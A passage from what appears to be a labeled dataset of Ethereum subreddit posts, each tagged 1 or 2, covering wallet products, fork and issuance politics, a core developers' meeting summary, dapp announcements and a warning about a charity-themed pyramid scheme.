have to also use your hardware wallet) * (social) recovery rules (e.g. if your account has not been touched for 100 days (you lost your keys), you can trigger a recovery process in which a set of your friends can give you back ownership) * exchange your keys if you have reasons to believe they might be compromised all of that is enabled with the contract design. however - to manage expectations - in this first release the benefit over other wallets is the 2 factor aspect. you can interact with dapps using the chrome extension and you will have to confirm the transaction on your phone as well. if either your computer or your phone gets compromised, your funds are still safe. some are asking us why we are building such a product when our main product is prediction markets? as a project early in the space (we had a [live prediction market](https://www.reddit.com/r/ethereum/comments/3i9i8m/groupgnosis_prediction_market_is_live_trading_has/) on mainnet just weeks after ethereum's launch in 2015), we have always contributed to infrastructure. at the time we prepared our token sale, there was no multisig wallet that could handle tokens - that is why we built what became the standard for teams in the space: https://wallet.gnosis.pm. instances of that contract handle around 2 million eth today and much more in tokens. the safe is the successor of that project with many improvements that make it easy enough for normal end-users to use it. for further reading, check blog.gnosis.pm and specifically this [post on the safe](https://blog.gnosis.pm/product-status-tl-dr-8f27ca699e93). when we release the prediction market, it will be possible for a user to use it only having a stable coin in their gnosis safe and without worrying about complicated gas pricing or loss of all funds if a single device is compromised. for help, questions, critique also join us on riot: https://chat.gnosis.pm/"	1
"yes, it sounds paranoid. and i hope i'm wrong, but sometimes i feel like we are back to the times of blockstream taking over bitcoin. here are some recent *deja vu* moments: 1. **btc:** andersen didn't want to be a benevolent dictator, so he passed control over bitcoin to core developers. and they kicked him out. **eth:** vitalik says in every interview that he is not controlling ethereum anymore and that all recent major decisions were made without his involvement. and how he is happy about it. &#x200b; 2. **btc:** majority of bitcoin holders and redditors were for block increase, but core developers have decided otherwise. **eth:** majority of ether holders and redditors are for issuance reduction to 1 eth, but developers have decided otherwise. &#x200b; 3. **btc:** block increase required changing one single line of code, but developers explained that it is very hard and risky, that it required a lot of discussing and testing. at the same time, it wasn't hard or risky to change the whole bitcoin codebase, to make it segwit-compartible. **eth:** issuance reduction requires changing one single line of code, but it's just too risky. seemingly, more risky than creating from scratch completely new ethereum 02. &#x200b; 4. **btc:** block increase was just a several months away, but every time the months passed, goalpost was shifted. **eth:** issuance reduction is just a several months away, but the goalpost is shifting again and again. &#x200b; 5. **btc:** every time the reason for the postponing was different (because it was not the real reason, but a pretext). wait, let's first discuss all bips for half-year. wait, let's wait another half-year for a conference. wait, let's wait another half-year for the second conference. wait, let's wait another half-year for the segwit. **eth:** zero inflation by summer! wait, let's make it 4%, by devcon. wait, a non-related bug found, let's postpone till after devcon. wait, santa is coming to town, let's postpone till january. wait, miners can fork away, let's postpone till difficulty bomb explodes. &#x200b; 6. **btc:** while eventually, when the n-th deadline was reached, they just plainly refused to do it at all. ever. **eth:** now we are told that pow will run along pos, ""for a foreseeable future"". &#x200b; 7. **btc:** suggestions on scaling (like adding in-between blocks) were just not discussed and developers that were suggesting it weren't invited to the scaling conference. instead, the conference discussed segwit. **eth:** progpow plans are not discussed on developers meetings anymore. why? just because. &#x200b; 8. **btc:** ""block increase would reduce number of nodes! risk of 51% attack!"". but giving all control to mining pools is ok, it's not a 51% attack. **eth:** ""issuance cut would reduce number of miners. risk of 51% attack!"". but developers doing things that good for miners only (high inflation, no progpow) is ok, it's not a 51% attack. &#x200b; 9. **btc:** users, getting tired of broken promises, were losing faith in bitcoin and leaving. market share of bitcoin have dropped from 85% to 32%. **eth:** users, getting tired of broken promises, are losing faith in ethereum and leaving. market share of ethereum have dropped from 32% to 9%. &#x200b; 10. **btc:** attempts to discuss it on forums were blocked by moderators ""because it's offtopic: altcoin discussion"". **eth:** just yesterday it was a thread here, about all this concerns, about the need to reduce issuance, to cut inflation. today the thread have mysteriously disappeared. deleted by moderators. ""because it's offtopic: price was mentioned""."	2
i'm a long time fan of both bitcoin and ethereum, and now have lived through forks on both networks. when ethereum classic was forked off, i remember clearly how /r/bitcoin allowed the discussion of ethereum (contrary to its rules about no altcoin-related discussions) and many of the members were mocking the platform. i consider myself a bitcoiner over an etherian, but it was an embarrassing moment -- a clear indication that many members of /r/bitcoin truly saw ethereum as a threat. on the other hand, bitcoin had its first major fork today, and there is little discussion in this community about the fork and no attempts to shit on bitcoin. impressive guys :)	2
hi, i created this project: [https://github.com/fergarrui/ethereum-graph-debugger](https://github.com/fergarrui/ethereum-graph-debugger) [example screenshot](https://i.redd.it/d0gf32pub6211.png) basically, the way we debug programs nowadays is stepping over or into instructions while they are being executed. in ethereum this is different, because the code already run, so we can take different approaches for debugging. the goal of this project, is to see the whole program flow and the execution of a specific transaction in one go. the left panel has the source code and the state of the evm in a specific step of the execution. clicking on the instructions opcodes will highlight the source code corresponding to that instruction and update the machine state. the right panel is the whole contract control flow, and the opcodes highlighted in red, are the instructions that were executed during an specific transaction. it is in a very early stage and it has some limitations (see the project readme for more information). i link a example debug file of a test dummy contract and a transaction running a function. the file can be found at: [debug file](http://htmlpreview.github.io/?https://raw.githubusercontent.com/fergarrui/ethereum-graph-debugger/master/examples/debug.html) even if it is in an early stage, i would love to read real usages, ideas and improvements, they will be much appreciated. i hope you find this useful! &#x200b; edit: thanks for the gold kind stranger! :)	2

proof systems are as old as computer science and there is absolutely no excuse for important contracts not to prove their correctness. the existing pursuits for that in ethereum don't look satisfactory. proofs shouldn't be a side benefit, they should be the central point of contracts. we need to take a lesson from haskell, idris, agda and the such and recognize how important that is. i, once again, urge that we stop trusting human validated contracts. as soon as we recover from this huge mess, the very first investment made by dao should contacting the creators of those languages and asking how solidity could be updated with dependent types. solidity is not fit for important contracts.	1
we run a website called [dappradar](https://dappradar.com). it tracks down ethereum games and other dapps (decentralized ethereum apps) and their activity. the data i am sharing with you is not yet publicly accessible in dappradar, but it will be soon. **[read article about this on medium](https://medium.com/@skirmantas.januskas/ethereum-games-pay-over-125-000-fees-to-miners-per-week-18f5875166ba)** [follow dappradar on twitter for more dapp insights](https://twitter.com/dappradar) working hard to switch from full-time web developer to an ethereum developer. in case you want to donate or get featured spot on dappradar, send me a message :)	1
"as a long time bitcoiner i'm naturally spooked by the idea of a contentious fork, but i gotta say i am very impressed with how it turned out. while i may philosophically disagree, the development community did a very good job of vocalizing their opinions and meeting an almost impossible deadline (not that i recommend rushing code like this again!). i talked with several core developers and influential bitcoin executives over the past two weeks who were truly worried and had no idea how it would play out.. so i feel confident saying you've taught us all new lessons. i still believe immutability is fundamental, but you've give me new context and facts to consider. i've been in crypto since 2012 so generally i have a ""seen it all"" attitude, but for once i've seen something totally new and it was very exciting to watch unfold- i want to say thanks for that. you've really done a service to the entire crypto community, and taught the good (convergence) and bad (politics) of a fork, which i'm sure will prove invaluable to bitcoin community one day. wish everyone here the best, now go get some sleep! much love, david bailey"	1

[yellow paper update](https://twitter.com/gavofyork/status/949662885222998018). gavin put the yellow paper under the creative commons free culture license cc-by-sa. yoichi and nick savers have been making progress handling the yellow paper prs. there is still the somewhat unresolved issue of what should define the ""formal standard"" of ethereum and should an update to the yellow paper or another specification be required for every new eip. this can be discussed in more detail in future meetings when there is greater attendance. ## [[7:43](https://youtu.be/bincocqdjq0?t=463)] 3. ewasm update + update on the following related eips. ### [[7:55](https://youtu.be/bincocqdjq0?t=475)] general update ewasm contributors are currently meeting in person together in lisbon. ewasm eips listed in the subpoints are not up to date and can be disregarded. people should use the github.com/ewasm/design repo. the design has been pretty much speced out in the last year. during the design phase there were 2 implementations done in parallel: javascript and c++ (which can be integrated in cpp-ethereum and geth). issues have been faced in building out ewasm including struggling with implementing synchronous code in javascript/browser. idea was to move to an asynchronous model. currently there is not a full decision on using synchronous vs asynchronous, but we are leaning towards synchronous implementation in c++ to run a testnet in cpp-ethereum that can run pure web assembly contracts. metering contract in web assembly is on the to-do list and doesn't rely on sync/async decision. likely will take week to come to a decision on sync vs async. more technical discussion and a funny anecdote involving the asynchronous vs synchronous decision and the affects of the recent spectre/meltdown attacks start at [[12:07](https://youtu.be/bincocqdjq0?t=727)]. ### [[15:08](https://youtu.be/bincocqdjq0?t=902)] a. evm 2.0 - https://github.com/ethereum/eips/issues/48 martin becze will be closing this eip. it is outdated. ### [[15:28](https://youtu.be/bincocqdjq0?t=928)] b. extend dup1-16 / swap1-16 with dupn / swapn - https://github.com/ethereum/eips/issues/174 this doesn't have to do with ewasm, it has to do with adding extra opcodes in the current evm. it is an upgrade to evm 1.0 which is not needed if we skip straight to ewasm. ### [[16:47](https://youtu.be/bincocqdjq0?t=1007)] c. subroutines and static jumps for the evm - https://github.com/ethereum/eips/issues/615 greg has been working with seed (gitter tag) who is writing an elm formalization of the eip. greg says that there is no formal social process for deciding things like evm 1.5 implementation so he is not sure if/when it would be implemented. greg has been working on cleaning up the proposal for those who want to use it. greg has some ideas around an evm 3.0 that pulls everything together with transpilation that he hasn't started working on yet and is not sure if he will. ## [[20:14](https://youtu.be/bincocqdjq0?t=1214)] 4. stateless client development. piper left some comments about some development of a stateless client for sharding, but it is very early. alexey had [a blog post](https://medium.com/@akhounov/how-to-speed-up-ethereum-in-the-face-of-crypto-kitties-7a9c901d98e9) describing stateless clients he may re-approach later. ## [[21:46](https://youtu.be/bincocqdjq0?t=1306)] 5. add ecadd and ecmul pre-compiles for secp256k1 - https://github.com/ethereum/eips/issues/603 [[see this blog post for context](https://medium.com/@clearmatics/privacy-on-ethereum-is-too-expensive-fb8b9e1815b2)]. this topic was brought up months ago with mixed commentary. christian r. says that ecadd and ecmul were never intended to be used for general purpose cryptography, but rather it was suppose to be used in conjunction with the pairing pre-compiles for a specific curve that is pairing friendly. christian says that in the past it has been discussed that there must be a very compelling reason for adding a pre-compile to ethereum. silur mentioned that the monero research team is working on a new ring signature (still unnamed) that can be viewed in the monero repository. the ewasm team may run some tests to compare native running of the pre-compiles vs ewasm. adding a new pre-compile would only give a constant speed-up or reduction in cost, but if we achieve the same thing in new virtual machine it will give us a constant speed-up for every conceivable routine and allows for building other schemes like casper and truebit. this is easier with web assembly because we can use existing c code. for the moment it looks like focusing energy on adding these proposed pre-compiles would not be worth it compared to just waiting for the next vm (likely ewasm) which will allow far more speed-ups across all computational routines. ## [[37:00](https://youtu.be/bincocqdjq0?t=2220)] 6. introduce miner heuristic ""child pays for parent"" (like in btc) to combat the weird cases when transactions with 1000 gwei stuck in the mempool (because they are dependent via nonce on transaction paying much less and not getting mined). [note: i tried my best to cover what was discussed here, but i am not an expert in ethereum transactions. if you find a mistake please point it out to me. thanks!] agenda item brought up to get people's opinion on this topic. currently in ethereum there are transactions that are stuck in the mempool for a long time because of the way transaction ordering per account is handled. the nonce of a transaction must be greater than the previous mined transactions (or equal if you are trying to replace a transaction). for example you can't process transaction #27 before transaction #26 has been mined. many of the stuck transactions are dependent on other transactions that pay a much smaller fee, but are not being mined. it seems people inadvertently send an initial transaction with too small of a fee and then more transactions at a higher nonce with a much higher fee that cannot be processed until the first small fee transaction is processed. alexey wondered if this may pose an attack vector or if we would get a benefit from implementing ""child pays for parent"" like bitcoin does. peter explained even if you define the max amount of gas your transaction could potentially consume, there is no guarantee it will use that much and we won't know until the transaction is processed (the only guarantee is that 21,000 gas will be consumed - a plain ether transfer). the attack vector example would be someone pushing a transaction that truly consumes 3,000,000 gas and attach a transaction fee of 1 wei and then push another tx that claims to consume 3,000,000 gas but with a transaction fee of 1000gwei. from the outside it looks like i can both can be executed for profit from the miner's perspective, but in reality the 2nd transaction will be processed first and the 1st tx will be long running and indirectly punish the miner. alexey was concerned about the mempool filling up and impact on clients due to the way nonces are handled. peter clarified that transactions in the mempool in the go ethereum client only maintains the top 4,000 most expensive transactions. if your cheap transaction gets evicted, the expensive transactions you stacked on top of it get evicted as well because they are no longer executable due to the nonce. ## [[42:21](https://youtu.be/bincocqdjq0?t=2541)] 7. creating a relay network of nodes to mitigate issues [described here](https://github.com/ethereum/pm/issues/29#issuecomment-356952590) and [other transaction propagation issues](https://github.com/ethereum/pm/issues/29#issuecomment-357151890). a relay network in general is a group of peers and/or miners who use a peer list to quickly connect to a group of known peers before connecting to (or instead of connecting to) random peers using network discovery. alexey conjectured that this may create a powerful ring of network players who can share transactions very quickly and hurt the little guys on the outside (hurting the idea of this being a mesh network of peers). clarifications were made about the issues involving transaction propagation issues with nodes with high transaction throughput such as infura and bittrex. clients suddenly stop pushing transactions or cannot keep up with the blockchain when they are pushing out so many transactions. hudson will work towards exploring this issue more and connecting the people with the issues with the devs. ## [[49:45](https://youtu.be/bincocqdjq0?t=2985)] 8. fork release management/constantinople. hudson will be working on writing up a starting plan to discuss potential release management issues. bitsbetripping sent hudson some good material about project management that he will review and bring to the next meeting. we need to start discussing constantinople sooner rather than later. ## [[52:55](https://youtu.be/bincocqdjq0?t=3175)] 9. client updates. - geth - improved tracing apis so people can write their own javascript tracers. event and subscription go wrappers are also coming along (they are similar to the go wrappers you can generate for contracts when entering the solidity code or abi). geth performance improvements are a major focus including a scheme to reduce disk iois database writes by about 60% (first proposed by nick) which will help your disk fill up 1/3 as fast (will not help improve sync time from scratch). also looking at some garbage collection ideas which reorganizes the database. the issue is that it may clash with fast sync. they want to design a solution that doesn't mess with, or in coordination with other clients update, fast sync. they are also fixing a memory issue that happens during sync. - cpp-ethereum - andrei is working on snapshot imports. fixes and updates to evm-c to make ewasm integration easier. - parity - no one available to give an update. - harmony - started to work on casper implementation and working on performance improvements. there are some unexpected difficulties. database improvements will come first, then the next release should reduce memory footprint and improving processing speed. no estimates yet on the next release, but database improvements are #1 priority. - ethereum-js - no updates. entire ethereum-js team focused on ewasm currently. - pyevm - no one available to give an update. piper left a text update: implementation of full node sync in pyevm is under way. stateless client work is ongoing as is implementation of a simplified ethgasstation gas estimation algorithm is in progress for web3.py. alpha release of pyevm client is happening soon. sharding and research development continues. - turbogeth - plan is to experiment with optimizations in geth. analysis to decrease the state size on the disk by decreasing the repetition of hashes in the stored state in ongoing. the goal is to store as much of the state as possible in memory. [[1:00:40](https://youtu.be/bincocqdjq0?t=3640)] discusses this in more detail as well as some stats on full nodes. there is a blog post update ## 10. other non-agenda items ### [[1:05:42](https://youtu.be/bincocqdjq0?t=3942)] question: will we see any scaling improvements from constantinople? answer is no because it potentially includes the first steps of the casper consensus protocol and some account abstraction eips, but both of those do not alleviate scaling issues. sharding would alleviate some of the issues. we are currently mostly bound by database and processing speed due to the database. short term there are a lot of client improvements that can be accomplished to improve disk i/o, but long term things like sharding will be necessary. the eth research site has a lot of interesting threads about sharding including merkle tree formats to be used and ideas around asynchronous accumulators ### [[1:09:57](https://youtu.be/bincocqdjq0?t=4197)] decision process for eips? needs to be improved. hudson and others will work on updating eip #1 and other improvements in q1. nick savers has been added as an eip editor. yoichi has been added as an editor. both are doing a great job. ## attendance alex beregszaszi (ewasm/solidity/ethereumjs), alex van de sande (mist/ethereum wallet), alexey akhunov (turbo geth), ben edgington (consensys/pegasys), casey detrio (volunteer), christian reitwiessner (cpp-ethereum/solidity), daniel ellison (consensys/lll), greg colvin (evm), hudson jameson (ethereum foundation), hugo de la cruz (ethereumjs/ewasm), jake lang (ewasm), jared wasinger (ethereumjs/ewasm), martin becze (ewasm), mikhail kalinin (harmony), paweł bylica (cpp-ethereum/ewasm), péter szilágyi (geth), silur (ethereumjs / ewasm)"	1

with the recent discovery of cve 2018-17144 found in bitcoin core protocol, despite their best efforts and their perfectionist attitude, a bug which could have crashed their network was allowed to slip through the cracks. the fact that this whole space dodged a bullet seeing how no miner exploited the bug, made me come to the realization that coding on blockchain protocols is a very delicate process. the bug which almost cost billions wasn’t even from an update that had any **major** changes. ethereum will be undergoing several hardforks and software upgrades over the course of the next 2-3 years, including a complete overhaul of how the network operates. there must be immense pressure from people using the chain to upgrade it and from the fact that billions of dollars of value is riding on their work being right while at the same time, trying to make sure that they get it right. i just want them to know that i understand any delays, and as a matter of fact, take as much time as you need to make ethereum as secure and safe as possible. you can’t rush changing the world. don’t let us fail before it even begins.	1
hi all, we've just released a completely decentralized and secure messaging service called lemonmail dapp. the dapp consist entirely of front-end javascript code that interacts with an ethereum contract that serves as a back-end. all message content is end-to-end encrypted and stored on ipfs. the front-end code is open source and also hosted on ipfs, although you are free to deploy and run it anywhere you want. this is still an early alpha version that aims to demonstrate that it is possible to achieve secure message exchange without trusted third-party. we encourage you to inspect the code and even deploy your own instance of the application and run it wherever you want. see our github page below for instructions on how to build and deploy the code. since we are still at an early testing stage, the ethereum contract runs on a kovan testnet. you will need a small amount of kovan ether in order to use the dapp - get in touch and we'll be more than happy to send you some. you will also need a chrome browser with metamask extension installed. you don't have to run a local ipfs node, since the javascript code already creates a temporary node for you. you can access the dapp through http://dapp.lemon.email (redirects to ipfs gateway). our github page: https://github.com/devanalabs/lemon.email-dapp for more details on how everything works, check about page within the dapp. we are looking forward to hearing your feedback and suggestions!	1
i'm not a dev so that's all i can do :p sorry had to do it.	2
i've been doing the rather nooby thing of leaving some coins on an exchange, with the recent price rise they've suddenly become enough that i don't feel comfortable doing this anymore. consequently i decided to move them to my own wallets. i first moved my bitcoins, and whilst i was waiting for the transfer to go through i had time to go make breakfast, have a shower and chill for a little bit. you know, have some me time. it was perfect! when i came back i logged in to my wallet and saw that my bitcoin had been waiting patiently for me to come back before they arrived :) when it came to moving my erc20 tokens, however, i barely had time to go get a drink before they arrived in my wallet. they even arrived before i had chance to log in! everything was so rushed, there was no time to enjoy the wait. nobody is ever going to use ethereum if they feel rushed by the transfer time... ... ;)	1

"i just saw this tweet from grosbill (a french computer parts, electronics online store) that announces the ability to pay using eth. source: https://twitter.com/grosbill_com/status/972396649094901760 for non-honhon speakers, the tweet says: ""paying with ethereum is for soon on grosbill. stay tunes"" link to the website for the curious ones : https://www.grosbill.com/"	1
following the instructions available on the official site does not yield successful result. only through googling i have learned about [faucet services](http://faucet.ropsten.be:3001) to load ether on the test net. however, such faucet service fails to function. i've followed all the instructions available and still unable to get testnet ether into my test account. my first impression of developing on ethereum is not great. this needs to be addressed asap because pretty soon you are going to find a large crowd of people turned off from the shitty experience. it's hard to imagine widespread usage when following the instructions on ethereum.org fails and attempts to get help from the community are shutdown. i'm actually very disappointed that this is the quality of development experience and it needs to be addressed immediately!	1

"there has been a lot of talk lately about how our community interacts with other projects in the space. some have reduced people's legitimate concerns to simple narratives like ""the ethereum community has become maximalist and intolerant."" i reject this notion and i feel that this is an unfair maligning of a broad and diverse community. what some may miss that there are many here who are in favor of multiple types of chains and approaches, but **just because they may not be in favor of the same approaches / chains that you are doesn't make them intolerant ""maximalists.""** i own quite a bit of bitcoin, for example. i also own tokens from other projects. but i am not in favor of chains like eos for many reasons- does that make me an ethereum maximalist? ethereum is more than a technology- it's an economic and social revolution. for many of us who believe in the value proposition of ethereum, the origins and goals of other projects (both stated and unstated), are of paramount importance when evaluating them. i realize that for others, ethereum is more of a technology revolution. for someone like me, it is all three. and for some of us, we find certain approaches in the open source blockchain space to be particularly objectionable (e.g., combining lucrative token sales raising funds beyond what is needed for development, benefiting a narrow group of stakeholders like vc's and hedge funds, and combining those things with on-chain governance for an l1). for the record, those are the very reasons i rejected eos. they are the same reasons why i reject other projects also, regardless of their technical prowess. and perhaps even more importantly, we also pay close attention to how your project leaders and team members interact with those in the ethereum community. is it productive and does it engage the whole community? is it consistently done in good faith? or is it demeaning? is it manipulative or divisive? eos burned many bridges when they launched themselves as an ""ethereum killer."" other projects are now making similarly foolish mistakes, possibly in more insidious and spectacular ways. *i have a message for those projects:* **it is not incumbent upon the ethereum community to blindly accept such alternative approaches (be they technical, fundraising, governance, engagement, communication, etc.) and be labeled as ""maximalists"" when we reject them, or refuse to accept the tacit endorsement of them by others-** it is incumbent upon those projects / communities to properly articulate their own value, as well as any additional value they may create for ethereum. and it is incumbent on those projects to respectfully engage with all relevant parts of the ethereum community in good faith through transparent and honest dialogue. *that's* how you gain the support of the ethereum community for a project- not forcing it down our throats and calling us intolerant when we question it. *you are not entitled to our support, you have to earn it.* i have long said that if i find a project which can decentralize the world better than ethereum, i will sell all of my eth and support said project. i look for that project regularly, and so far, despite all of the marketing narratives from competing (or complementary) projects, i still haven't found it."	1
the strong point of blockchain is trust and public control, and therefore the strength of ethereum smart contracts is that they can be applied in areas where strong trust is necessary: voting, trading, and so on. this definitely should work, but is not getting a lot of traction at least so far, especially for the general public. then there are games. on the one hand, games does not equal gambling. on the other hand, since blockchain allows convenient transfer of value, and any transaction has a cost, blockchain games that don't involve transfer of value just make no sense. why do people play [cryptokitties](https://cryptokitties.co)? because they like playing breeding cats and paying for that? hell no, that's because they want to get an expensive cat and likely sell it. playing for money? that's the definition of gambling. investment gaming? investment gambling? but that was what got people to use ethereum more, it got metamask more popular, that's a real application and that's generally good. so is it good or evil at the bottom line? here's another example i ran into: [etherjack.io](https://etherjack.io/). they made an intricate penny auction on ethereum. looks like a casino, but if you read the rules, it's actually a trustless penny auction. they are collecting ether for the prize fund, and are going to launch as soon as it's collected. gambling? kind of, like everything else. they used blockchain to solve the problem of non-transparent and rigged penny auctions. i'm sure when they finally get that prize collected and actually start the game they will make some hype and attract new people to use ethereum and actually perform some transactions and see how it works. good or evil? projects like this highlight the power of smart contract: when coded right, people can trust value to a piece of software, and be sure it delivers on the promise, and nothing can be rigged. this never was the case in real life where it's easy to use power and influence to obscure anything no matter how big it is. on the blockchain it's the opposite, every small detail is public. is games (involving playing for value) what will make ethereum mainstream (good)? or will all those projects create a bad public image to it (evil)?	2

"to summarize a few things that had been said before, and as a general reminder. consider a few points please: - this is not a business. it's extremely hard and i can imagine maybe dangerous to set certain deadlines for implementations that haven't been done before, and on a platform that is running with ~30billion at stake, and an ecosystem with many moving parts. - it's clear this isn't easy. it seems very little developers can add real value in ethereum's pos and casper implementations. this isn't a project starting from zero on the whiteboard, this is a 2 year old 'breathing' network with much at stake, in fact paving the way and inspiring other projects. - having an opinion and being sure of yourself about it is great, but don't just have an opinion for the sake of having one, and if a majority sees technical merit in one direction, doubt yourself a little. - if you feel there's missing data somewhere or docs that need updating, do it yourself. this is an open-source project meant for everyone in it's community to add value to. it would be silly for an open-source project this big with large goals to be giving bounties for small tasks, or hire for basic work. - there's a certain style of communication and progress for the project to maintain, making changes to that style by adding newer people is really tricky and i imagine could have a negative effect, or result in unnecessary time wasted. i find the progress strategy for the ethereum project as a whole to be very successful up to this point, so far it's communicated effectively, made strategic alliances (with individuals & organizations), and cemented it's technical legacy, as well as maintained a healthy public image (important and underestimated). it should be clear by this point that no one's more motivated than the project individuals themselves, so as a ""network supporter"" measure when the right time is to use different approaches in communication. hope i'm not offending anyone, but i think we need an upside reminder, and some better vibes for the work ahead."	1

"hi, i hope this is ok to post here. i am big into cryptocurrency and work in the industry. but i do not post here often. i have run across a project calling itself ["" project ethereum""](https://projectethereum.com/) that concerns me for a variety of reasons. one its hitching a ride on the ethereum name, and to my knowledge has zero relationship with the [ethereum foundation](https://www.ethereum.org/foundation) if that was not bad enough they are claiming people will earn 4.8 million dollars from donating 100.00 usd and by getting others to sign up underneath them, there are 8 levels to reach 4.8 million. all the while this is supposed to be helping feed and nourish starving kids via [choice humanitarian](http://www.choicehumanitarian.org). choice is a great organization. this project is not listed on the site. i have written them about my concerns about their reputation and that their first encounter with crypto should not be this one. helping people does not need to be a get rich quick scheme. that is not what eth is about. i know, there are tons and tons of scams. and with the influx of new people to crypto the fishing is good this time of year. this one, unless i am completely wrong in my analysis of a scam , is preying on some good people who really think this is legit. am i crazy or is this a problem? i think it's bad for ethereum and bad for choice. ethereum is about so much more than making money and there are ample real opportunities to use it to help in such endeavours as humanitarian work. maybe this is not a realistic request but i believe it would be good to see a statement from the ethereum foundation that they have zero to do with this group and project. i normally don't jump on bandwagons but seeing the videos using fly covered kids to pump a get rich scheme irks me to no end. they are already being banned from most forums that have mods. what are peoples thoughts? what can be done or should anything be done? edit update - https://steemit.com/ethereum/@tomshwom/ethereum-scam-using-charity-to-fool-people please read this steemit article by /atleastsignificant it has significant updates in it. to my knowledge the project has not launched yet. so it's unclear to me if choice has gotten any funds yet. it is possible as every person that joins forks over 100 bucks. i personally still consider this very much a ponzi scheme or at best another mlm that uses people new to crypto. thanks for all the comments and action. it was really good to see and wake up to. i have a ton of messages to check. also be warned they are saying they will lawyer up against any slander. so, try not to be slanderous. the facts are enough. when debating on youtube i got the impression that these are not ill intentioned people. they are simply naive. edit 2- https://www.facebook.com/projectethereumofficial/ this is there facebook page. there is a post addressed to us that believe this is a scam and it is open for comment. my only suggestion is to try and maybe talk some sense into the people signing up they drank the koolaid and are simply naive to this mlm scheme. but be careful there is another legal threat you should read in the comments. i posted a very long response."	2
